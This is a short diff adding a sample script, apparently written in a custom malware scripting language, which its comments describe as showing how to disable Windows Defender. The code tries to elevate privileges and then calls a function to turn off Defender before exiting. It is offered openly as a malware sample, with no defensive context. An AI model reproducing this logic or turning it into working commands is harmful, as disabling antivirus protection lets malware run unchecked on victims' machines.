@@ -1,0 +1,10 @@
+@ Showcasing how you can disable the windows defender, this will require the malware to be run with 
+@ elevated rights
+
+[version 1.1]
+
+main:{
+    system.elevate(); @ Tries to gain elevated rights on the system
+    #pwsh.disable.defender(); @ This will disable on windows based systems
+    system.exit("0");
+}
